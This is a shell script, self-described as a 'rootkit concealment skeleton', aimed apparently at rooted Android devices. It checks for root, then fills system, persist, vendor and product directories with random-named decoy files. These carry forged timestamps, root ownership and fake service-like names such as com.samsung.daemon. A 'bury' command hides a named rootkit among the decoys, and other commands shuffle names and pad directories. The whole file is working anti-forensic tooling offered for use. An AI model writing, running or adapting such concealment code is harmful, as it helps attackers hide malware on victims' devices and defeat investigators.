# file sea camouflage and rootkit concealment skeleton

ZC_ROOT="/data/local/zc"
ZC_SYSTEM="/system/etc/zc"
ZC_PERSIST="/persist/zc"
ZC_VENDOR="/vendor/etc/zc"
ZC_PRODUCT="/product/etc/zc"
ZC_LOG="$ZC_ROOT/zc.log"
ZC_DB="$ZC_ROOT/state.db"
ZC_LMX_DB="$ZC_ROOT/lmx_state.db"
ZC_LMX_LOG="$ZC_ROOT/lmx.log"
ZC_LMX_MANIFEST="$ZC_ROOT/lmx_manifest.txt"
ZC_VERSION="1.0"
ZC_LMX_COUNT=20
ZC_LMX_MIN_SIZE=64
ZC_LMX_MAX_SIZE=4096
ZC_LMX_SUFFIXES="OCX PNF SYS DLL BFS NPA LCK PG PRO VER CAB TLB DRV VXD CPL AX FON GRP MSI OLB"
ZC_LMX_PREFIXES="sys svc drv lib msc api cfg res tmp dat log"
ZC_LMX_DIRS="system persist vendor product data tmp cache media"

zc_lmx_log() {
  local msg="$1"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "[$ts] $msg" >> "$ZC_LOG" 2>/dev/null
  echo "[$ts] $msg" >> "$ZC_LMX_LOG" 2>/dev/null
}

zc_lmx_init_dirs() {
  mkdir -p "$ZC_ROOT" 2>/dev/null
  chmod 700 "$ZC_ROOT" 2>/dev/null
  zc_lmx_log "lmx dirs initialized"
}

zc_lmx_init_db() {
  if [ ! -f "$ZC_LMX_DB" ]; then
    echo "CREATE TABLE decoys (path TEXT PRIMARY KEY, size TEXT, suffix TEXT, ts TEXT);" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
    echo "CREATE TABLE targets (path TEXT PRIMARY KEY, name TEXT, ts TEXT);" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
    echo "CREATE TABLE lmx_state (key TEXT PRIMARY KEY, value TEXT);" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
    zc_lmx_log "lmx db initialized"
  fi
}

zc_lmx_state_set() {
  local key="$1"
  local value="$2"
  echo "INSERT OR REPLACE INTO lmx_state (key, value) VALUES ('$key', '$value');" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
}

zc_lmx_state_get() {
  local key="$1"
  sqlite3 "$ZC_LMX_DB" "SELECT value FROM lmx_state WHERE key='$key';" 2>/dev/null
}

zc_lmx_add_decoy() {
  local path="$1"
  local size="$2"
  local suffix="$3"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "INSERT OR REPLACE INTO decoys (path, size, suffix, ts) VALUES ('$path', '$size', '$suffix', '$ts');" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
}

zc_lmx_add_target() {
  local path="$1"
  local name="$2"
  local ts
  ts=$(date +"%Y-%m-%d %H:%M:%S")
  echo "INSERT OR REPLACE INTO targets (path, name, ts) VALUES ('$path', '$name', '$ts');" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
}

zc_lmx_check_root() {
  if [ "$(id -u)" -ne 0 ]; then
    zc_lmx_log "not root, abort"
    return 1
  fi
  return 0
}

zc_lmx_rand_hex() {
  local len="$1"
  local out
  if [ -r /dev/urandom ]; then
    out=$(head -c "$len" /dev/urandom | od -An -tx1 | tr -d ' \n')
  else
    out=$(date +%s%N | sha256sum | cut -c1-"$((len * 2))")
  fi
  echo "$out"
}

zc_lmx_rand_alpha() {
  local len="$1"
  local out
  if [ -r /dev/urandom ]; then
    out=$(head -c "$len" /dev/urandom | tr -dc 'A-Z' | head -c "$len")
  else
    out=$(date +%s%N | sha256sum | tr -dc 'A-Z' | head -c "$len")
  fi
  echo "$out"
}

zc_lmx_rand_num() {
  local min="$1"
  local max="$2"
  local out
  if [ -r /dev/urandom ]; then
    out=$(od -An -tu4 -N4 /dev/urandom | tr -d ' ')
  else
    out=$(date +%s%N)
  fi
  if [ -z "$out" ]; then
    out=0
  fi
  echo $((out % (max - min + 1) + min))
}

zc_lmx_rand_suffix() {
  local count
  count=$(echo "$ZC_LMX_SUFFIXES" | wc -w)
  local idx
  idx=$(zc_lmx_rand_num 1 "$count")
  echo "$ZC_LMX_SUFFIXES" | cut -d' ' -f"$idx"
}

zc_lmx_rand_prefix() {
  local count
  count=$(echo "$ZC_LMX_PREFIXES" | wc -w)
  local idx
  idx=$(zc_lmx_rand_num 1 "$count")
  echo "$ZC_LMX_PREFIXES" | cut -d' ' -f"$idx"
}

zc_lmx_rand_name() {
  local prefix
  local suffix
  local mid
  prefix=$(zc_lmx_rand_prefix)
  suffix=$(zc_lmx_rand_suffix)
  mid=$(zc_lmx_rand_alpha 6)
  echo "$prefix$mid.$suffix"
}

zc_lmx_rand_size() {
  zc_lmx_rand_num "$ZC_LMX_MIN_SIZE" "$ZC_LMX_MAX_SIZE"
}

zc_lmx_fill_file() {
  local path="$1"
  local size="$2"
  if [ -r /dev/urandom ]; then
    head -c "$size" /dev/urandom > "$path" 2>/dev/null
  else
    dd if=/dev/zero of="$path" bs=1 count="$size" 2>/dev/null
  fi
}

zc_lmx_fake_timestamp() {
  local path="$1"
  local days="$2"
  local fake
  fake=$(date -d "$days days ago" +"%Y%m%d%H%M.%S" 2>/dev/null)
  if [ -n "$fake" ]; then
    touch -t "$fake" "$path" 2>/dev/null
  fi
}

zc_lmx_set_attrs() {
  local path="$1"
  chmod 644 "$path" 2>/dev/null
  chown 0:0 "$path" 2>/dev/null
}

zc_lmx_make_decoy() {
  local dir="$1"
  local name
  name=$(zc_lmx_rand_name)
  local path="$dir/$name"
  if [ -e "$path" ]; then
    name="$(zc_lmx_rand_prefix)$(zc_lmx_rand_alpha 8).$(zc_lmx_rand_suffix)"
    path="$dir/$name"
  fi
  local size
  size=$(zc_lmx_rand_size)
  zc_lmx_fill_file "$path" "$size"
  zc_lmx_set_attrs "$path"
  local days
  days=$(zc_lmx_rand_num 30 365)
  zc_lmx_fake_timestamp "$path" "$days"
  zc_lmx_add_decoy "$path" "$size" "$(echo "$name" | awk -F. '{print $NF}')"
  echo "$path"
}

zc_lmx_make_decoys() {
  local dir="$1"
  local count="$2"
  if [ ! -d "$dir" ]; then
    zc_lmx_log "dir missing: $dir"
    return 1
  fi
  local i=1
  while [ "$i" -le "$count" ]; do
    zc_lmx_make_decoy "$dir" >/dev/null
    i=$((i + 1))
  done
  zc_lmx_log "decoys created in $dir: $count"
}

zc_lmx_make_decoys_all() {
  local dir
  for dir in "$ZC_SYSTEM" "$ZC_PERSIST" "$ZC_VENDOR" "$ZC_PRODUCT"; do
    if [ -d "$dir" ]; then
      zc_lmx_make_decoys "$dir" "$ZC_LMX_COUNT"
    fi
  done
}

zc_lmx_mask_file() {
  local target="$1"
  local dir
  dir=$(dirname "$target")
  local name
  name=$(basename "$target")
  if [ ! -f "$target" ]; then
    zc_lmx_log "mask target missing: $target"
    return 1
  fi
  zc_lmx_add_target "$target" "$name"
  zc_lmx_log "masked: $target"
}

zc_lmx_mask_all() {
  local dir
  for dir in "$ZC_SYSTEM" "$ZC_PERSIST" "$ZC_VENDOR" "$ZC_PRODUCT"; do
    if [ -d "$dir" ]; then
      local f
      for f in "$dir"/*; do
        if [ -f "$f" ]; then
          case "$f" in
            *.OCX|*.PNF|*.SYS|*.DLL|*.BFS|*.NPA|*.LCK|*.PG|*.PRO|*.VER|*.CAB|*.TLB|*.DRV|*.VXD|*.CPL|*.AX|*.FON|*.GRP|*.MSI|*.OLB)
              continue
              ;;
          esac
          zc_lmx_mask_file "$f"
        fi
      done
    fi
  done
}

zc_lmx_pad_dir() {
  local dir="$1"
  local count="$2"
  if [ ! -d "$dir" ]; then
    return 1
  fi
  local i=1
  while [ "$i" -le "$count" ]; do
    local sub
    sub="$dir/$(zc_lmx_rand_alpha 8)"
    mkdir -p "$sub" 2>/dev/null
    local j=1
    while [ "$j" -le 3 ]; do
      zc_lmx_make_decoy "$sub" >/dev/null
      j=$((j + 1))
    done
    i=$((i + 1))
  done
  zc_lmx_log "dir padded: $dir"
}

zc_lmx_pad_all() {
  local d
  for d in $ZC_LMX_DIRS; do
    local full="/$d"
    if [ -d "$full" ]; then
      zc_lmx_pad_dir "$full" 3
    fi
  done
}

zc_lmx_fake_service_name() {
  local prefixes="android com.sec com.google com.android com.samsung com.huawei com.xiaomi"
  local suffixes="service provider manager helper daemon agent proxy"
  local p
  local s
  p=$(echo "$prefixes" | tr ' ' '\n' | shuf -n 1 2>/dev/null)
  s=$(echo "$suffixes" | tr ' ' '\n' | shuf -n 1 2>/dev/null)
  if [ -z "$p" ]; then
    p="com.android"
  fi
  if [ -z "$s" ]; then
    s="service"
  fi
  echo "$p.$s"
}

zc_lmx_make_service_like() {
  local dir="$1"
  local count="$2"
  if [ ! -d "$dir" ]; then
    return 1
  fi
  local i=1
  while [ "$i" -le "$count" ]; do
    local name
    name=$(zc_lmx_fake_service_name)
    local suffix
    suffix=$(zc_lmx_rand_suffix)
    local path="$dir/$name.$suffix"
    local size
    size=$(zc_lmx_rand_size)
    zc_lmx_fill_file "$path" "$size"
    zc_lmx_set_attrs "$path"
    local days
    days=$(zc_lmx_rand_num 60 720)
    zc_lmx_fake_timestamp "$path" "$days"
    zc_lmx_add_decoy "$path" "$size" "$suffix"
    i=$((i + 1))
  done
  zc_lmx_log "service-like created in $dir: $count"
}

zc_lmx_bury_rootkit() {
  local rootkit="$1"
  if [ ! -f "$rootkit" ]; then
    zc_lmx_log "rootkit missing: $rootkit"
    return 1
  fi
  local dir
  dir=$(dirname "$rootkit")
  zc_lmx_make_decoys "$dir" "$ZC_LMX_COUNT"
  zc_lmx_make_service_like "$dir" "$ZC_LMX_COUNT"
  zc_lmx_log "rootkit buried in $dir"
}

zc_lmx_shuffle_names() {
  local dir="$1"
  if [ ! -d "$dir" ]; then
    return 1
  fi
  local f
  for f in "$dir"/*; do
    if [ -f "$f" ]; then
      local ext
      ext=$(echo "$f" | awk -F. '{print $NF}')
      case "$ext" in
        OCX|PNF|SYS|DLL|BFS|NPA|LCK|PG|PRO|VER|CAB|TLB|DRV|VXD|CPL|AX|FON|GRP|MSI|OLB)
          continue
          ;;
      esac
      local newname
      newname="$(zc_lmx_rand_prefix)$(zc_lmx_rand_alpha 8).$ext"
      local newpath="$dir/$newname"
      if [ ! -e "$newpath" ]; then
        mv "$f" "$newpath" 2>/dev/null
      fi
    fi
  done
  zc_lmx_log "names shuffled in $dir"
}

zc_lmx_manifest_write() {
  local out="$1"
  if [ -z "$out" ]; then
    out="$ZC_LMX_MANIFEST"
  fi
  sqlite3 "$ZC_LMX_DB" "SELECT path, size, suffix FROM decoys ORDER BY path;" 2>/dev/null > "$out"
  zc_lmx_log "manifest written: $out"
}

zc_lmx_manifest_read() {
  local in="$1"
  if [ ! -f "$in" ]; then
    zc_lmx_log "manifest missing: $in"
    return 1
  fi
  local line
  while IFS= read -r line; do
    if [ -z "$line" ]; then
      continue
    fi
    local path
    local size
    local suffix
    path=$(echo "$line" | cut -d'|' -f1)
    size=$(echo "$line" | cut -d'|' -f2)
    suffix=$(echo "$line" | cut -d'|' -f3)
    if [ -n "$path" ]; then
      zc_lmx_add_decoy "$path" "$size" "$suffix"
    fi
  done < "$in"
  zc_lmx_log "manifest read: $in"
}

zc_lmx_verify_decoys() {
  local total=0
  local exist=0
  local path
  while IFS= read -r path; do
    total=$((total + 1))
    if [ -f "$path" ]; then
      exist=$((exist + 1))
    fi
  done <<EOF
$(sqlite3 "$ZC_LMX_DB" "SELECT path FROM decoys;" 2>/dev/null)
EOF
  zc_lmx_log "verify decoys: $exist/$total"
  echo "$exist $total"
}

zc_lmx_remove_decoys() {
  local path
  while IFS= read -r path; do
    if [ -f "$path" ]; then
      rm -f "$path" 2>/dev/null
    fi
  done <<EOF
$(sqlite3 "$ZC_LMX_DB" "SELECT path FROM decoys;" 2>/dev/null)
EOF
  echo "DELETE FROM decoys;" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
  zc_lmx_log "decoys removed"
}

zc_lmx_remove_decoys_in() {
  local dir="$1"
  if [ ! -d "$dir" ]; then
    return 1
  fi
  local path
  while IFS= read -r path; do
    case "$path" in
      "$dir"/*)
        if [ -f "$path" ]; then
          rm -f "$path" 2>/dev/null
        fi
        echo "DELETE FROM decoys WHERE path='$path';" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
        ;;
    esac
  done <<EOF
$(sqlite3 "$ZC_LMX_DB" "SELECT path FROM decoys;" 2>/dev/null)
EOF
  zc_lmx_log "decoys removed in $dir"
}

zc_lmx_count_decoys() {
  sqlite3 "$ZC_LMX_DB" "SELECT COUNT(*) FROM decoys;" 2>/dev/null
}

zc_lmx_count_targets() {
  sqlite3 "$ZC_LMX_DB" "SELECT COUNT(*) FROM targets;" 2>/dev/null
}

zc_lmx_list_decoys() {
  sqlite3 "$ZC_LMX_DB" "SELECT path FROM decoys ORDER BY path;" 2>/dev/null
}

zc_lmx_list_targets() {
  sqlite3 "$ZC_LMX_DB" "SELECT path, name FROM targets ORDER BY path;" 2>/dev/null
}

zc_lmx_cleanup_old() {
  local cutoff
  cutoff=$(date -d "7 days ago" +"%Y-%m-%d %H:%M:%S" 2>/dev/null)
  if [ -z "$cutoff" ]; then
    return 0
  fi
  echo "DELETE FROM decoys WHERE ts < '$cutoff';" | sqlite3 "$ZC_LMX_DB" 2>/dev/null
  zc_lmx_log "old decoys cleaned"
}

zc_lmx_self_test() {
  local dir
  dir="$ZC_ROOT/lmx_test"
  mkdir -p "$dir" 2>/dev/null
  local name
  name=$(zc_lmx_rand_name)
  if [ -z "$name" ]; then
    zc_lmx_log "self test name failed"
    return 1
  fi
  local path="$dir/$name"
  zc_lmx_fill_file "$path" 128
  if [ ! -f "$path" ]; then
    zc_lmx_log "self test file failed"
    return 1
  fi
  rm -rf "$dir" 2>/dev/null
  zc_lmx_log "self test passed"
  return 0
}

zc_lmx_status() {
  echo "ZC lmx version: $ZC_VERSION"
  echo "root: $(id -u)"
  echo "decoy count: $(zc_lmx_count_decoys)"
  echo "target count: $(zc_lmx_count_targets)"
  echo "suffixes: $ZC_LMX_SUFFIXES"
  echo "lmx db: $ZC_LMX_DB"
  echo "lmx log: $ZC_LMX_LOG"
}

zc_lmx_main() {
  zc_lmx_log "Limux.sh start"
  zc_lmx_check_root || exit 1
  zc_lmx_init_dirs
  zc_lmx_init_db
  zc_lmx_state_set "version" "$ZC_VERSION"
  zc_lmx_make_decoys_all
  zc_lmx_make_service_like "$ZC_SYSTEM" "$ZC_LMX_COUNT"
  zc_lmx_make_service_like "$ZC_PERSIST" "$ZC_LMX_COUNT"
  zc_lmx_mask_all
  zc_lmx_manifest_write
  zc_lmx_verify_decoys
  zc_lmx_cleanup_old
  zc_lmx_status
  zc_lmx_log "Limux.sh done"
}

case "$1" in
  start)
    zc_lmx_main
    ;;
  make)
    zc_lmx_make_decoys_all
    ;;
  service)
    zc_lmx_make_service_like "$2" "$3"
    ;;
  mask)
    zc_lmx_mask_all
    ;;
  bury)
    zc_lmx_bury_rootkit "$2"
    ;;
  pad)
    zc_lmx_pad_all
    ;;
  shuffle)
    zc_lmx_shuffle_names "$2"
    ;;
  manifest)
    zc_lmx_manifest_write "$2"
    ;;
  verify)
    zc_lmx_verify_decoys
    ;;
  count)
    zc_lmx_count_decoys
    ;;
  list)
    zc_lmx_list_decoys
    zc_lmx_list_targets
    ;;
  remove)
    zc_lmx_remove_decoys
    ;;
  remove-in)
    zc_lmx_remove_decoys_in "$2"
    ;;
  clean)
    zc_lmx_cleanup_old
    ;;
  selftest)
    zc_lmx_self_test
    ;;
  status)
    zc_lmx_status
    ;;
  *)
    zc_lmx_main
    ;;
esac

exit 0